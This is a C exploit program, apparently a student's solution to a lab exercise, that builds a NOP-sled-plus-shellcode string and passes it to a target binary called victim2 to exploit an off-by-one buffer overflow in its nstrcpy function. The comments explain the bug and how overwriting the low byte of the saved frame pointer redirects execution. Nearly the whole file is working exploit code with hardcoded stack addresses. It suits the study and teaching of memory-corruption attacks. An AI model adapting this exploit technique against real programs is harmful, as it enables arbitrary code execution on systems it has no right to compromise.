#include <err.h>
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <string.h>
#include "shellcode.h"

int main(int argc, char *argv[])
{
  char *args[3];
  char *env[1];

  if (argc != 2) {
    fprintf(stderr, "Usage: %s /path/to/victim2\n", argv[0]);
    exit(EXIT_FAILURE);
  }

/* 
 * Victim2 contained a off-by-one buffer overflow in the nstrcpy function
 * 	where the for loop that copies over the bytes checks if 'i >= strlen(buf)'
 * 	which includes the null-terminator and will allow us to overflow
 *
 * Specifically, I overwrote the least significant byte of the EBP (LE) which caused
 * 	it to point to memory in the exploit string
 *
 * The EBP register is used to keep track of where the EIP is stored. By altering the LSB
 * 	it can be shifted to higher memory.
 *
 * If the exp_str contains the memory address of our string we can point the EBP to it which
 * 	will cause the program to return to out shellcode.
 *
 * -----------------------------------------------------------------------------------------
 *
 * Buffer address ~= 0xbfffff15 -> 0xbfffff35 (roughly within NOP Slide)
 * Length of buffer = 200
 * Shellcode len = 46 - 1 (NULL)
 *
 * 201 - 45 - 64 (32 return addresses)
 * 92 NOPs
 *
 */
#define EXPLEN 202 // Buffer 200 + overflow + NULL
  char return_address[] = "\x35\xff\xff\xbf";
  char exp_str[EXPLEN];

  // Assemble your exploit string here
  //'\x90'*92 + shellcode + '\x25\xff\xff\xbf'*32 + NULL

  memset(exp_str, 0x90, EXPLEN-1); // Fill With NOP
 
  // Copy shellcode into exp_str + 92 to allow 92 NOPs before it
  strcpy(exp_str + 92, shellcode); 
   
  // Fill the remainder of exp_str to our return address (somewhere in the NOPs)
  for(int i = 0; i < 64; i+=4) {
    strcpy(exp_str + 91 + 46 + i, return_address);
  }

  exp_str[EXPLEN - 2] = 0x45;  
  exp_str[EXPLEN - 1] = 0; // NULL terminate

  args[0] = argv[1];
  args[1] = exp_str;
  args[2] = NULL;
  env[0] = NULL;

  if (execve(argv[1], args, env) < 0)
    err(EXIT_FAILURE, "Cannot execute %s", argv[1]);
  return EXIT_SUCCESS;
}
